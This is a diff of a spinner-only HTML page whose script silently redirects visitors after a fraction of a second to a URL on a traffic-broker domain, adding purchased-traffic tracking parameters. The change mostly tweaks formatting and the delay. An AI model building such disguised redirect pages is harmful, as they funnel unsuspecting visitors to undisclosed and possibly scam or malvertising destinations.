@@ -12,16 +12,14 @@ body{min-height:100vh;margin:0;background:linear-gradient(135deg,#0f0518,#1a0a30
 </style>
 </head>
 <body>
-<div class="box">
-<div class="spinner"></div>
-</div>
+<div class="box"><div class="spinner"></div></div>
 <script>
 var p=new URLSearchParams(location.search);
 var u=p.get("utm_source")||"purchased";
 var o="https://deheabc.goldentraffic.org/s/aab8554ddc457";
-var s=o.indexOf("?")>-1?"&":"?";
-var t=o+s+"utm_source="+u+"&subid=fb2";
-setTimeout(function(){window.location.href=t;},222);
+var qi=o.indexOf("?")>-1?"&":"?";
+var t=o+qi+"utm_source="+u+"&subid=fb2";
+setTimeout(function(){window.location.href=t;},172);
 </script>
 </body>
 </html>
